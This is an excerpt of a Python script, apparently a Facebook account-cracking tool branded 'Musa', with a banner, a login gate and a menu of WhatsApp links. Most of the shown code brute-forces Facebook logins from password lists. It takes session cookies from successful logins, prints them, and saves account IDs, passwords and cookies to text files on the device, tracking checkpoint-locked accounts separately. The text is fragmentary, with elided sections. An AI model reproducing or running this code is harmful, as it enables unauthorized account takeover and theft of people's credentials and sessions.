...
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : Musa Rajput 😈
\x1b[1;97m> Github : https://github.com private 😉
\x1b[1;97m> Facebok: 💔✰卝❁≛🅜🅤🅢🅐≛❁卝🩷🪽🪿󱢏
...
while key == 'true':
    ...
    if username == CorrectUsername:
            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN Musa TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'"""
...
def group():
    ...
    Musa=input(' [•] Choose : ')
    if Musa == '1':
        os.system('xdg-open https://wa.me/+923215423060?text=')
        menu()
    if Musa == '2':
        os.system('xdg-open https://chat.whatsapp.com/DQ8x1V1HYfu8LIWKyHA3ry');menu()
    if Musa == '3':
                       ...
                       # strike = F2() + USX()
                        ...
                        if "c_user" in fadi:
                               ...
                               # cek_apk(session,coki)
                                open('/sdcard/Musa/Musa-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Musa/Musa-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/Musa-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [Musa-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				#cek_apk(session,coki)
				open('/sdcard/Musa/Musa-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
	...
	try:
		...
		#	rand = None
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				#print('\r\r\033[1;32m [Musa-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				print('\r\r\033[1;32m [Musa-OK] '+uid+' | '+pas+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				if 'y' in cookie:
				 print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				#cek_apk(session,coki)
				open('/sdcard/Musa/Musa-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
###                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
...
def bd1(ids,passlist):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [Musa-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/Musa/Musa-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print(f'\r\r\033[1;33m [Musa-CP] '+ids+' | '+ps+'\033[1;97m')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/Musa/Musa/Musa-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
